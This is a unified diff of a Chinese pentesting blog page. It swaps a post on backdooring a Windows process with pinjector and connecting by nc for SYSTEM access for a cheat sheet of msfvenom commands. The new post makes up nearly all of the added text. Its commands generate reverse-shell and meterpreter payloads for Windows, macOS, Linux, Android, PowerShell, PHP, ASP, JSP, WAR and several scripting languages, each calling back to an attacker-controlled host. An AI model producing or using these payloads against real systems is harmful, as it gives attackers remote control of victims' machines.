@@ -79,24 +79,17 @@
 
 
 
-<meta name="description" content="注入进程提权相当于开了一个后门,隐蔽性极高,不会创建新的进程,很难发现，便于进行隐蔽的监听 工具下载pinjector.exe 程序下载地址https://www.tarasco.org/security/Process_Injector/index.html 测试过程靶机：win server2003ip：192.168.195.129  使用cmd 运行pinjector.exe 程序123p">
+<meta name="description" content="使用msfvenom -h命令查看所有参数常用参数：12345-p   设置 payload-e   设置编码方式-a   系统结构，默认x86-f   生成文件格式-o   保存 payload Windows msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &amp;gt; shell.exe  Mac msfvenom">
 <meta property="og:type" content="article">
-<meta property="og:title" content="注入进程提权（工具-Pinjector）">
-<meta property="og:url" content="http://wcute.github.io/2018/10/22/注入进程提权（工具-Pinjector）/index.html">
+<meta property="og:title" content="msfvenom 常用生成 Payload 命令">
+<meta property="og:url" content="http://wcute.github.io/2019/03/22/msfvenom 常用生成 Payload 命令/index.html">
 <meta property="og:site_name" content="鸡翅儿">
-<meta property="og:description" content="注入进程提权相当于开了一个后门,隐蔽性极高,不会创建新的进程,很难发现，便于进行隐蔽的监听 工具下载pinjector.exe 程序下载地址https://www.tarasco.org/security/Process_Injector/index.html 测试过程靶机：win server2003ip：192.168.195.129  使用cmd 运行pinjector.exe 程序123p">
+<meta property="og:description" content="使用msfvenom -h命令查看所有参数常用参数：12345-p   设置 payload-e   设置编码方式-a   系统结构，默认x86-f   生成文件格式-o   保存 payload Windows msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &amp;gt; shell.exe  Mac msfvenom">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-a93816f981a22c7f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-e441463110f0eb4c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-e1f5b970e815ec26.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-93eae6666258e7e2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-9d16a8edafe0bc21.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-6f77851cc05f3feb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2019-03-20T07:32:27.708Z">
+<meta property="og:updated_time" content="2019-03-22T02:56:05.199Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="注入进程提权（工具-Pinjector）">
-<meta name="twitter:description" content="注入进程提权相当于开了一个后门,隐蔽性极高,不会创建新的进程,很难发现，便于进行隐蔽的监听 工具下载pinjector.exe 程序下载地址https://www.tarasco.org/security/Process_Injector/index.html 测试过程靶机：win server2003ip：192.168.195.129  使用cmd 运行pinjector.exe 程序123p">
-<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/12585049-a93816f981a22c7f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta name="twitter:title" content="msfvenom 常用生成 Payload 命令">
+<meta name="twitter:description" content="使用msfvenom -h命令查看所有参数常用参数：12345-p   设置 payload-e   设置编码方式-a   系统结构，默认x86-f   生成文件格式-o   保存 payload Windows msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &amp;gt; shell.exe  Mac msfvenom">
 
 
 
@@ -126,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="http://wcute.github.io/2018/10/22/注入进程提权（工具-Pinjector）/">
+  <link rel="canonical" href="http://wcute.github.io/2019/03/22/msfvenom 常用生成 Payload 命令/">
 
 
 
 
 
-  <title>注入进程提权（工具-Pinjector） | 鸡翅儿</title>
+  <title>msfvenom 常用生成 Payload 命令 | 鸡翅儿</title>
   
 
 
@@ -291,7 +284,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/10/22/注入进程提权（工具-Pinjector）/">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2019/03/22/msfvenom 常用生成 Payload 命令/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="wcute">
@@ -308,7 +301,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">注入进程提权（工具-Pinjector）</h1>
+          <h1 class="post-title" itemprop="name headline">msfvenom 常用生成 Payload 命令</h1>
         
 
         <div class="post-meta">
@@ -320,8 +313,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-22T21:05:03+08:00">
-                2018-10-22
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-22T10:56:03+08:00">
+                2019-03-22
               </time>
             
 
@@ -343,8 +336,8 @@
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/内网渗透/" itemprop="url" rel="index">
-                    <span itemprop="name">内网渗透</span>
+                  <a href="/categories/Metasploit-渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">Metasploit 渗透测试</span>
                   </a>
                 </span>
 
@@ -380,30 +373,53 @@
       
 
       
-        <h4 id="注入进程提权"><a href="#注入进程提权" class="headerlink" title="注入进程提权"></a>注入进程提权</h4><p>相当于开了一个后门,隐蔽性极高,不会创建新的进程,很难发现，便于进行隐蔽的监听</p>
-<h4 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h4><p>pinjector.exe 程序下载地址<br><a href="https://www.tarasco.org/security/Process_Injector/index.html" target="_blank" rel="noopener">https://www.tarasco.org/security/Process_Injector/index.html</a></p>
-<h4 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h4><p>靶机：win server2003<br>ip：192.168.195.129</p>
-<ol>
-<li>使用<code>cmd</code> 运行<code>pinjector.exe</code> 程序<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pinjector			# 参数及说明</span><br><span class="line">pinjector -l 		# 列出当前执行的进程及其相应的用户名</span><br><span class="line">pinjector -p pid cmd port     # 对pid进程执行注入</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-a93816f981a22c7f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
-<ol start="2">
-<li><p>查看当前进程及用户<br><img src="https://upload-images.jianshu.io/upload_images/12585049-e441463110f0eb4c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"><br>此时1234端口未被占用<br><img src="https://upload-images.jianshu.io/upload_images/12585049-e1f5b970e815ec26.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"></p>
-</li>
-<li><p>使用<code>pinjector</code>命令，选取其中一个进程进行注入</p>
-<blockquote>
-<p>   <code>pinjector -p 440 cmd 1234</code></p>
+        <p>使用<code>msfvenom -h</code>命令查看所有参数<br>常用参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-p   设置 payload</span><br><span class="line">-e   设置编码方式</span><br><span class="line">-a   系统结构，默认x86</span><br><span class="line">-f   生成文件格式</span><br><span class="line">-o   保存 payload</span><br></pre></td></tr></table></figure></p>
+<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><blockquote>
+<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f exe &gt; shell.exe</your></your></p>
 </blockquote>
-</li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-93eae6666258e7e2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"></p>
-<ol start="4">
-<li><p>再次查看1234端口发现被占用<br><img src="https://upload-images.jianshu.io/upload_images/12585049-9d16a8edafe0bc21.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"></p>
-</li>
-<li><p>同时kali中可以利用<code>nc</code>进行监听，获取system权限<br><img src="https://upload-images.jianshu.io/upload_images/12585049-6f77851cc05f3feb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"></p>
-</li>
-</ol>
+<h4 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h4><blockquote>
+<p>msfvenom -p osx/x86/shell_reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f macho &gt; shell.macho</your></your></p>
+</blockquote>
+<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><blockquote>
+<p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f elf &gt; shell.elf</your></your></p>
+</blockquote>
+<h4 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h4><blockquote>
+<p>//需要签名<br>msfvenom -a x86 –platform Android -p android/meterpreter/reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f apk -o payload.apk</your></your></p>
+</blockquote>
+<h4 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h4><blockquote>
+<p>msfvenom -a x86 –platform Windows -p windows/powershell_reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1</your></your></p>
+</blockquote>
+<h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><blockquote>
+<p>msfvenom -p php/meterpreter_reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f raw &gt; shell.php<br>cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</your></your></p>
+</blockquote>
+<h4 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h4><blockquote>
+<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f asp &gt; shell.asp</your></your></p>
+</blockquote>
+<h4 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h4><blockquote>
+<p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f raw &gt; shell.jsp</your></your></p>
+</blockquote>
+<h4 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h4><blockquote>
+<p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f war &gt; shell.war</your></your></p>
+</blockquote>
+<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><blockquote>
+<p>msfvenom -p cmd/unix/reverse_python LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f raw &gt; shell.py</your></your></p>
+</blockquote>
+<h4 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h4><blockquote>
+<p>msfvenom -p cmd/unix/reverse_bash LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f raw &gt; shell.sh</your></your></p>
+</blockquote>
+<h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><blockquote>
+<p>msfvenom -p cmd/unix/reverse_perl LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f raw &gt; shell.pl</your></your></p>
+</blockquote>
+<h4 id="Nodejs"><a href="#Nodejs" class="headerlink" title="Nodejs"></a>Nodejs</h4><blockquote>
+<p>msfvenom -p nodejs/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.js</p>
+</blockquote>
+<h4 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h4><blockquote>
+<p>msfvenom -p ruby/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.rb</p>
+</blockquote>
+<h4 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h4><blockquote>
+<p>msfvenom -p cmd/unix/reverse_lua LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.lua</p>
+</blockquote>
+<p>参考链接：<br><a href="https://github.com/micro8/Gitbook/blob/master/Chapter1/10_msfvenom%E5%B8%B8%E7%94%A8%E7%94%9F%E6%88%90payload%E5%91%BD%E4%BB%A4.md" target="_blank" rel="noopener">https://github.com/micro8/Gitbook/blob/master/Chapter1/10_msfvenom%E5%B8%B8%E7%94%A8%E7%94%9F%E6%88%90payload%E5%91%BD%E4%BB%A4.md</a><br><a href="https://www.cnblogs.com/zlgxzswjy/p/6881904.html" target="_blank" rel="noopener">https://www.cnblogs.com/zlgxzswjy/p/6881904.html</a></p>
 
       
     </div>
@@ -428,8 +444,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/08/11/三层-ARP中间人攻击（工具P2P）/" rel="next" title="三层-ARP中间人攻击（工具P2P）">
-                <i class="fa fa-chevron-left"></i> 三层-ARP中间人攻击（工具P2P）
+              <a href="/2019/03/20/Web中间件常见漏洞整理/" rel="next" title="Web中间件常见漏洞整理">
+                <i class="fa fa-chevron-left"></i> Web中间件常见漏洞整理
               </a>
             
           </div>
@@ -437,10 +453,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/12/09/渗透测试-靶机Bulldog2/" rel="prev" title="渗透测试-靶机Bulldog2">
-                渗透测试-靶机Bulldog2 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -563,7 +575,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#注入进程提权"><span class="nav-number">1.</span> <span class="nav-text">注入进程提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#工具下载"><span class="nav-number">2.</span> <span class="nav-text">工具下载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#测试过程"><span class="nav-number">3.</span> <span class="nav-text">测试过程</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows"><span class="nav-number">1.</span> <span class="nav-text">Windows</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Mac"><span class="nav-number">2.</span> <span class="nav-text">Mac</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux"><span class="nav-number">3.</span> <span class="nav-text">Linux</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Android"><span class="nav-number">4.</span> <span class="nav-text">Android</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Powershell"><span class="nav-number">5.</span> <span class="nav-text">Powershell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP"><span class="nav-number">6.</span> <span class="nav-text">PHP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ASP"><span class="nav-number">7.</span> <span class="nav-text">ASP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JSP"><span class="nav-number">8.</span> <span class="nav-text">JSP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WAR"><span class="nav-number">9.</span> <span class="nav-text">WAR</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Python"><span class="nav-number">10.</span> <span class="nav-text">Python</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Bash"><span class="nav-number">11.</span> <span class="nav-text">Bash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Perl"><span class="nav-number">12.</span> <span class="nav-text">Perl</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Nodejs"><span class="nav-number">13.</span> <span class="nav-text">Nodejs</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Ruby"><span class="nav-number">14.</span> <span class="nav-text">Ruby</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lua"><span class="nav-number">15.</span> <span class="nav-text">Lua</span></a></li></ol></div>
             
 
           </div>
